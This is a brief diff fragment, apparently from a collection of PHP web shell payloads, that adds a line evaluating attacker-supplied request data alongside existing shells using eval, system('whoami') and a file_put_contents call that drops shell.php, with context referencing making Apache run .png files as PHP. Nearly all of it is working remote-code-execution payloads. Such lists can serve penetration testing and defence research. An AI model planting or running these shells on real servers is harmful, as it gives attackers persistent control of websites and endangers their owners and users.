@@ -118,6 +118,9 @@ AddType application/x-httpd-php .png
 <?php 
 @eval($_POST['cmd']);
 ?>
+<?php
+@eval($_REQUEST['cmd']);
+?>
 <?php system("whoami"); ?>
 <?php
 file_put_contents("shell.php","<?php @eval($_POST['cmd']); ?>");
